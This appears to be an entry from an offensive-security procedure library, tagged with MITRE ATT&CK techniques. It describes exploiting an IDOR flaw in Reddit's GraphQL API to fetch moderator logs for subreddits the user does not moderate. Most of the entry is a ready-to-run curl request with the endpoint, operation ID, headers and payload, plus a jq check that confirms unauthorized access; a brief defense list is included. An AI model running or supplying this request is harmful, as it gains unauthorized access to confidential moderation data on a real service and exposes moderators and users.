---
tags:
  - idor
  - graphql
  - mod-logs
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/reddit-graphql-modlogs-initial]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:48.068Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 9533bda1-aa52-4614-bb9a-f7ddbdfad6b2
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Fetch-Initial-Moderator-Logs-via-GraphQL

## Summary

This procedure sends the initial GraphQL POST request to Reddit's endpoint using operation ID '6243efcbc61d' to fetch the first page of moderator logs for a specified subreddit, exploiting IDOR by targeting unauthorized communities.

## Description

The GraphQL query lacks checks to ensure the authenticated user moderates the subreddit named in 'subredditName'. By modifying this variable to any public or restricted subreddit, an attacker retrieves sensitive logs including bans and removals. This targets the endpoint at https://gql.reddit.com/ with standard headers.

## Requirements

1. Valid Reddit bearer token
2. Target subreddit name
3. curl or similar HTTP client
4. Knowledge of GraphQL operation ID

## Defense

Defensive measures and detection strategies:

- Implement server-side authorization verifying user mod status for subreddit
- Log and monitor GraphQL queries for mismatched subreddit-user pairs
- Rate-limit unauthenticated or suspicious API calls

## Objectives

1. Retrieve first page of mod logs without authorization
2. Expose confidential moderator actions
3. Identify pagination for full data collection

## Instructions

### Step 1: Prepare and Send Initial Query

**Context**: Construct the JSON payload with the operation ID and subreddit variable, then POST to the endpoint.

**Command** ([[commands/reddit-graphql-modlogs-initial]]):
```bash
curl -X POST https://gql.reddit.com/ \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" \
  -H "Accept: */*" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer your_token" \
  -H "Origin: https://www.reddit.com" \
  -H "Referer: https://www.reddit.com/" \
  -d '{"id":"6243efcbc61d","variables":{"subredditName":"target-subreddit"}}'
```

> Sends the request; expected output is JSON with 'data' containing modActions array, hasNextPage, and endCursor if paginated.

### Step 2: Validate Response

**Context**: Confirm unauthorized access by checking for log data.

**Command** (jq parse):
```bash
# Pipe output to jq: curl ... | jq '.data.modActions'
```

> Displays logs if successful; empty or error if blocked.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/reddit-graphql-modlogs-initial]]

## Tools Used


## Tags

- idor
- graphql-query
